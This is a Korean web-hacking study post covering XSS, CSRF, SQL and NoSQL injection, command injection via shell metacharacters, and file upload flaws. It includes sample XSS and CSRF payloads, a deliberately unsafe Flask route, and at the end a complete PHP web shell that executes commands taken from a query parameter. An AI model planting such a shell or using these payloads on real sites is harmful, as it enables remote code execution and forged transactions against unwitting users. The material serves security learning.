<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Exploit | AswinBlue</title><meta name=keywords content><meta name=description content="XSS (Cross Site Scripting) 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다. XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다. 공격 경로 XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다. 악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다. Flask는 render_template 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다."><meta name=author content="AswinBlue"><link rel=canonical href=https://aswinblue.github.io/Blog/post/webhacking/exploit/><meta name=google-site-verification content="XYZabc"><link crossorigin=anonymous href=https://aswinblue.github.io/Blog/assets/css/stylesheet.min.f92d651568443750d127ad6450a5621c2bf278d2c45216a3d199fd40eafc2473.css integrity="sha256-+S1lFWhEN1DRJ61kUKViHCvyeNLEUhaj0Zn9QOr8JHM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=https://aswinblue.github.io/Blog/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js integrity="sha256-uVus3DnjejMqn4g7Hni+Srwf3KK8HyZB9V4809q9TWE=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://aswinblue.github.io/Blog/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://aswinblue.github.io/Blog accesskey=h title="AswinBlue (Alt + H)">AswinBlue</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://aswinblue.github.io/Blog/archives title=Archive><span>Archive</span></a></li><li><a href=https://aswinblue.github.io/Blog/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://aswinblue.github.io/Blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://aswinblue.github.io/Blog/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><div class=grid-container><div style=float:left;margin:30px class=auto-hide-div><ul><li style=list-style-position:inside;text-indent:20px;color:#1284ff><a href=https://aswinblue.github.io/Blog/post/webhacking/>WebHacking</a><ul><li style=list-style-position:inside;text-indent:30px;color:#1284ff;content:\25ba\00a0><a href=https://aswinblue.github.io/Blog/post/webhacking/exploit/>Exploit</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webhacking/cookie/>Cookie</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webhacking/web/>Web</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webhacking/http/>HTTP</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/>System Hacking</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/reverse_engineering/>Reverse Engineering</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/exploit/>Exploit</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/systemhacking/pwntool/>Pwntool</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/assembly/>Assembly</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/assembly/assembly_basic/>Assembly_basic</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/>🔷Projects</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/youtube_downloader/>Youtube Downloader</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/delver/>Delver</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/projects/flick_through/>FlickThrough</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/windowapp/>WindowApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/windowapp/window_programming/>Window_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/windowapp/kivy/>Kivy</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/>WebServer</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/spring_boot/>Spring_boot</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/spring/>Spring basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webserver/nodejs/>Nodejs</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/>WebApplication</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/thymeleaf/>thymeleaf</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/tailwind/>Tailwind</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/angular/>Angular</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/react_basic/>React basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/pythoncgi/>PythonCGI</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/javascript/>JavaScript</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/css/>Css</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/webapplication/html/>HTML</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/python/>Python</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/python/python_basic/>Python 기초</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/mobileapp/>MobileApp</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/mobileapp/flutter/>Flutter</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/machinelearning/>MachineLearning</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/machinelearning/tensorflow/>Tensorflow</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/java/>Java</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/java/jython/>Jython</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/>Linux</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/ipc/>IPC</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/thread/>Thread</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/process/>Process</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/system_programming/>System_programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/shell_programming/>Shell Programming</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_introduction/>Linux_introduction</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_env/>Linux_env</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/virtual_box/>Virtual_box</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_command/>Linux commands</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/linux/linux_apt/>Linux_apt</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/hugo/>Hugo</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/hugo/hugo_dev/>Hugo 환경세팅</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/hugo/sample/>Markdown Syntax Guide</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/golang/>GoLang</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/golang/golang/>Golang</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/git/>Git</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/git/git/>Git</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/>DevelopTips</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/vscode/>VsCode</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/window/>Window</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/developtips/web_scrapping/>Web_scrapping</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/>DataBases</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/database/>Database</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/firebase_react/>Firebase_react</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/firebase/>Firebase</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/databases/mysql/>Mysql</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/crypto/>Crypto</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/crypto/cryptocurrency/>Cryptocurrency</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/computerscience/>ComputerScience</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/computerscience/computer_science/>Computer Science</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/cloud/>Cloud</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/cloud/aws/>Aws</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/ci_cd/>CI_CD</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/ci_cd/docker/>Docker</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/algorithm/>Algorithm</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/algorithm/algorithm/>Algorithm</a></li></ul></li><li style=list-style-position:inside;text-indent:20px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/>C++</a><ul><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/unit_test/>Unit Test</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/make/>Make</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/gcc/>Gcc</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/c++_stl/>C++_stl</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/gdb/>GDB</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/c++/>C++ basic</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/cmake/>CMake</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/json_c++/>Json in C++</a></li><li style=list-style-position:inside;text-indent:30px;color:#fff><a href=https://aswinblue.github.io/Blog/post/c++/log_c++/>spdlog C++</a></li></ul></li><ul></ul><ul></ul></ul></div><main class=main style=grid-row:1;grid-column:2;width:100%><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://aswinblue.github.io/Blog>Home</a></div><h1 class=post-title>Exploit</h1><div class=post-meta><span title='2025-03-11 20:54:59 +0900 KST'>March 11, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;AswinBlue&nbsp;|&nbsp;<a href=https://github.com/AswinBlue/HugoBlog/tree/master/content/post/WebHacking/exploit.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#xss-cross-site-scripting aria-label="XSS (Cross Site Scripting)">XSS (Cross Site Scripting)</a><ul><li><a href=#%ea%b3%b5%ea%b2%a9-%ea%b2%bd%eb%a1%9c aria-label="공격 경로">공격 경로</a></li><li><a href=#xss-%ea%b3%b5%ea%b2%a9-%ec%a2%85%eb%a5%98 aria-label="XSS 공격 종류">XSS 공격 종류</a></li></ul></li><li><a href=#csrf-cross-site-request-forgery aria-label="CSRF (Cross Site Request Forgery)">CSRF (Cross Site Request Forgery)</a><ul><li><a href=#%ea%b3%b5%ea%b2%a9-%ea%b2%bd%eb%a1%9c-1 aria-label="공격 경로">공격 경로</a></li><li><a href=#sql-injection aria-label="SQL Injection">SQL Injection</a></li><li><a href=#nosql-injection aria-label="NoSQL Injection">NoSQL Injection</a></li><li><a href=#command-injection aria-label="Command Injection">Command Injection</a></li><li><a href=#file-vulnerability aria-label="File Vulnerability">File Vulnerability</a></li></ul></li><li><a href=#%ea%b3%b5%ea%b2%a9-%ea%b8%b0%eb%b2%95 aria-label="공격 기법">공격 기법</a></li></ul></div></details></div><div class=post-content><h1 id=xss-cross-site-scripting>XSS (Cross Site Scripting)<a hidden class=anchor aria-hidden=true href=#xss-cross-site-scripting>#</a></h1><ul><li>공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에서 해당 스크립트를 실행하는 공격이다.</li><li>XSS 취약점이 존재하는 사이트에 공격자는 origin 권한으로 악성 스크립트가 포함된 페이지를 만들어서 이용자가 악성 스크립트가 포함된 페이지를 방문하면 공격자의 악성 스크립트가 동작해 정보를 탈취하는 방식이다.</li></ul><h2 id=공격-경로>공격 경로<a hidden class=anchor aria-hidden=true href=#공격-경로>#</a></h2><ul><li>XSS 공격은 이용자가 삽입한 내용을 출력하는 기능에서 발생한다.<ul><li>악성 태그를 필터링하는 HTML Sanitization을 사용하거나 엔티티 코드로 치환하는 방법으로 XSS를 예방할 수 있다.</li><li>Flask는 <code>render_template</code> 함수를 사용하여 인자를 HTML 엔티티코드로 변환하여 출력하는 방식으로 XSS를 방지한다.</li></ul></li><li>아래와 같이 입력값을 그대로 출력하게 되면, 입력값으로 script 를 전달해 공격에 사용할 수 있다.<ul><li>서버의 코드<pre tabindex=0><code>@app.route(&#34;/vulnerable&#34;)
def vulnerable():
    param = request.args.get(&#34;param&#34;, &#34;&#34;) # 이용자가 입력한 인자를 가져옴
    return param # 이용자의 입력값을 화면 상에 표시
</code></pre></li><li>공격자 입력1. 다른 페이지로 redirection<pre tabindex=0><code>&lt;script&gt;location.href = &#34;/another_page?param=PARAM1&#34;;&lt;/script&gt;
</code></pre></li><li>공격자 입력2. cookie 정보 출력<pre tabindex=0><code>&lt;script&gt;document.cookie&lt;/script&gt;
</code></pre></li></ul></li></ul><h2 id=xss-공격-종류>XSS 공격 종류<a hidden class=anchor aria-hidden=true href=#xss-공격-종류>#</a></h2><ul><li>XSS 는 악성 스크립트의 위치와 침투 경로에 따라 아래와 같이 구분된다.<ul><li>Stored XSS : XSS에 사용되는 악성 스크립트가 서버에 저장되고 서버의 응답에 담겨오는 XSS<ul><li>게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있음</li><li>불특정 다수에게 보여지기 때문에 파급력이 크다.</li></ul></li><li>Reflected XSS : XSS에 사용되는 악성 스크립트가 URL에 삽입되고 서버의 응답에 담겨오는 XSS<ul><li>게시판 서비스에서 작성된 게시물을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있음</li><li>검색 결과를 응답에 포함하는 일부 서비스에서 발생 가능</li><li>공격을 위해서는 다른 이용자를 악성 스크립트가 포함된 링크에 접속하도록 유도해야 함</li></ul></li><li>DOM-based XSS : XSS에 사용되는 악성 스크립트가 URL Fragment에 삽입되는 XSS</li><li>Universal XSS : 클라이언트의 브라우저 혹은 브라우저의 플러그인에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS</li></ul></li></ul><h1 id=csrf-cross-site-request-forgery>CSRF (Cross Site Request Forgery)<a hidden class=anchor aria-hidden=true href=#csrf-cross-site-request-forgery>#</a></h1><ul><li>어떤 사이트에서 이용자의 신원 정보가 포함된 쿠키를 사용한다면, 타인의 쿠키를 탈취하여 변조된 명령을 서버로 번달하는 공격 방식이다.<ul><li>이용자의 신원 정보가 포함된 쿠키는 일종의 서명과 같은 역할을 하기 때문에, 쿠키가 특정 명령에 대한 이용자의 본인 인증 역할을 수행할 수도 있다.</li></ul></li><li>2차 인증을 수행하지 않고 cookie로만 인증을 하는 사이트에 대해 공격이 가능하다.</li><li><code>XSS</code>는 인증 정보인 세션 및 쿠키 탈취를 목적으로 서버에서 스크립트를 실행 하는 방식인 반면, <code>CSRF</code>는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격이다.</li></ul><h2 id=공격-경로-1>공격 경로<a hidden class=anchor aria-hidden=true href=#공격-경로-1>#</a></h2><ul><li><code>&lt;img></code> 태그나 <code>&lt;form></code> 태그를 활용해서 사용자가 의도하지 않은 명령을 서버에 요청하는 script를 실행시킬 수 있다.<pre tabindex=0><code>/* img 태그 활용 요청 전달 */
&lt;img src=&#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39; width=0px height=0px&gt;`
</code></pre><pre tabindex=0><code>/* javascript 공격 예시 */
/* 새 창 띄우기 */
window.open(&#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39;);
/* 현재 창 주소 옮기기 */
location.href = &#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39;;
location.replace(&#39;http://bank.dreamhack.io/sendmoney?to=Dreamhack&amp;amount=1337&#39;);
</code></pre></li></ul><h2 id=sql-injection>SQL Injection<a hidden class=anchor aria-hidden=true href=#sql-injection>#</a></h2><ul><li>조작된 SQL 쿼리를 서버에 주입하여 인증을 우회하거나, 데이터베이스의 정보를 유출하는 공격행위</li><li>Blind SQL Injection : SQL Injection 의 한 종류로, DBMS가 답변 가능한 형태로 질문을 수행하여 스무고개 게임과 같이 정답을 유추해 나가는 공격 기법</li></ul><h2 id=nosql-injection>NoSQL Injection<a hidden class=anchor aria-hidden=true href=#nosql-injection>#</a></h2><ul><li>NoSQL은 데이터 타입으로 &lsquo;오브젝트&rsquo; 라는 개념을 갖는다. 오브젝트 타입의 입력값을 처리할 때에는 쿼리 연산자를 사용할 수 있고, 이 부분의 취약점을 활용한 것이 NoSQL Injection 이다.</li><li>NodeJs를 예를 들면 아래와 같이 url에 object를 대입할 수 있다.<pre tabindex=0><code>// 서버 코드 예시
const express = require(&#39;express&#39;);
const app = express();
app.get(&#39;/&#39;, function(req,res) {
    console.log(&#39;data:&#39;, req.query.data);
    console.log(&#39;type:&#39;, typeof req.query.data);
    res.send(&#39;hello world&#39;);
});
const server = app.listen(3000, function(){
    console.log(&#39;app.listen&#39;);
});
</code></pre><pre tabindex=0><code>// 결과 예시
http://localhost:3000/?data=1234
data: 1234
type: string

http://localhost:3000/?data[]=1234
data: [ &#39;1234&#39; ]
type: object

http://localhost:3000/?data[]=1234&amp;data[]=5678
data: [ &#39;1234&#39;, &#39;5678&#39; ] 
type: object

http://localhost:3000/?data[5678]=1234
data: { &#39;5678&#39;: &#39;1234&#39; } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data=0000
data: { &#39;5678&#39;: &#39;1234&#39;, &#39;0000&#39;: true } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data[]=0000
data: { &#39;0&#39;: &#39;0000&#39;, &#39;5678&#39;: &#39;1234&#39; } 
type: object

http://localhost:3000/?data[5678]=1234&amp;data[1111]=0000
data: { &#39;1111&#39;: &#39;0000&#39;, &#39;5678&#39;: &#39;1234&#39; } 
type: object
</code></pre><ul><li>이 방법으로 아래와 같이 &lsquo;data&rsquo; 객체 안에 NoSQL 쿼리가 들어가도록 url을 설정할 수도 있다.<ul><li><a href=../databases/database/#%EB%AC%B8%EB%B2%95>NoSQL 문법 참조</a></li></ul><pre tabindex=0><code>http://localhost:3000/?data[$eq]=A
data: { &#34;$eq&#34;: &#34;A&#34; } 
type: object
</code></pre></li></ul></li></ul><h2 id=command-injection>Command Injection<a hidden class=anchor aria-hidden=true href=#command-injection>#</a></h2><ul><li>공격자가 클라이언트 인터페이스를 통해 서버측에 시스템 명령어를 전달하여 실행시켜 공격을 수행하는 기법</li><li>PHP의 <code>system</code>, Node JS의 <code>child_process</code>, 파이썬의 <code>os.system</code> 과 같이 시스템 명령어를 수행하는 함수에 이용자가 임의의 인자를 전달할 수 있을 때 발생할 수 있다.</li><li>명령어 입력란에 다른 명령어를 입력하는 기법에는 다음의 <code>메타문자</code> 들을 활용할 수 있다.<ol><li>명령어 치환<ul><li>리눅스 쉘에서 <code>``</code> 사이에 든 문자는 새로운 명령어 라인으로 인식한다.<ul><li>ex) echo `ls`<ul><li>ls 명령어가 실행된다.</li></ul></li></ul></li><li>리눅스 쉘에서 <code>$()</code> 사이에 든 문자는 새로운 명령어 라인으로 인식한다.<ul><li>ex) echo $(ls)<ul><li>ls 명령어가 실행된다.</li></ul></li></ul></li></ul></li><li>명령어 연속 실행</li></ol><ul><li>리눅스 쉘에서 <code>||</code> 를 사용하면, || 앞과 || 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.<ul><li>한 줄에 둘 이상의 명령어를 실행시킬 수 있다.</li><li>ex) mkdir FILE || cd FILE<ul><li>FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.</li></ul></li></ul></li><li>리눅스 쉘에서 <code>&&</code> 를 사용하면, && 앞과 && 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.<ul><li>ex) mkdir FILE && cd FILE<ul><li>FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.</li></ul></li></ul></li><li>리눅스 쉘에서 <code>;</code> 를 사용하면, ; 앞과 ; 뒤를 다른 명령어 라인으로 인식하고 각각 실행한다.<ul><li>ex) mkdir FILE ; cd FILE<ul><li>FILE 디렉터리를 만들고 FILE 디렉터리 안으로 이동하는 명령을 한줄로 수행할 수 있다.</li></ul></li></ul></li></ul><ol start=3><li>파이프<ul><li>리눅스 쉘에서 <code>|</code> 를 사용하면 | 앞의 명령어 실행 결과를 | 뒤의 명령어 실행시 입력으로 설정할 수 있다.<ul><li>ex) cat FILE | less<ul><li>FILE 내용을 출력한 것을 less 명령으로 나눠서 볼 수 있도록 한다.</li></ul></li></ul></li></ul></li><li>뒷내용 무시<ul><li>리눅스 쉘에서 <code>#</code>을 사용하면 # 뒤의 내용은 주석처리되어 무시된다.<ul><li>ex) ls #a"sdfa"sd&rsquo;fas"&rsquo;&ldquo;df<ul><li>구문 오류 없이 ls 명령이 잘 실행된다.</li></ul></li></ul></li></ul></li></ol></li></ul><h2 id=file-vulnerability>File Vulnerability<a hidden class=anchor aria-hidden=true href=#file-vulnerability>#</a></h2><ul><li>공격자의 파일을 웹 서비스의 파일 시스템에 업로드 혹은 하는 과정에서 발생하는 보안 취약점</li><li>파일 업로드/다운로드 서비스를 개발시 이용자가 업로드한 파일을 데이터베이스에 저장하는 것보다는 서버의 파일 시스템에 저장하는 것이 개발하기 쉽고, 관리 효율도 높지만 File Vulnerability를 주의해야 한다.</li><li>원격 코드 실행, 민감정보 탈취 등이 수행될 수 있다.</li></ul><ol><li><p>File Upload Vulnerability</p><ul><li>파일 업로드가 가능한 path 에 제약을 우회하여 임의 디렉터리에 파일을 업로드 할 수 있는 취약점이다.</li><li>File Upload Vulnerability 중 하나로, 이용자가 업로드될 파일의 이름을 임의로 정할 수 있을 때 발생한다.</li><li><code>..</code> 과 같은 메타 문자를 활용하여 지정된 디렉터리 외의 디렉터리를 참조하는 방식을 취할 수 있다.</li><li>악의적인 파일로 html 파일을 수정한다면 Cross-Site-Scripting 공격으로 이어질 수 있다.</li><li>.php, .jsp, .asp와 같은 파일을 업로드 하면 <a href=../web/#CGI-(Common-Gateway-Interface)>CGI</a> 를 통해 서버에서 코드를 실행시킬 수도 있다.</li><li>ex) php web shell example</li></ul><pre tabindex=0><code>&lt;html&gt;&lt;body&gt;
&lt;form method=&#34;GET&#34; name=&#34;&lt;?php echo basename($_SERVER[&#39;PHP_SELF&#39;]); ?&gt;&#34;&gt;
&lt;input type=&#34;TEXT&#34; name=&#34;cmd&#34; autofocus id=&#34;cmd&#34; size=&#34;80&#34;&gt;
&lt;input type=&#34;SUBMIT&#34; value=&#34;Execute&#34;&gt;
&lt;/form&gt;&lt;pre&gt;
&lt;?php
    if(isset($_GET[&#39;cmd&#39;]))
    {
        system($_GET[&#39;cmd&#39;]);
    }
?&gt;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;
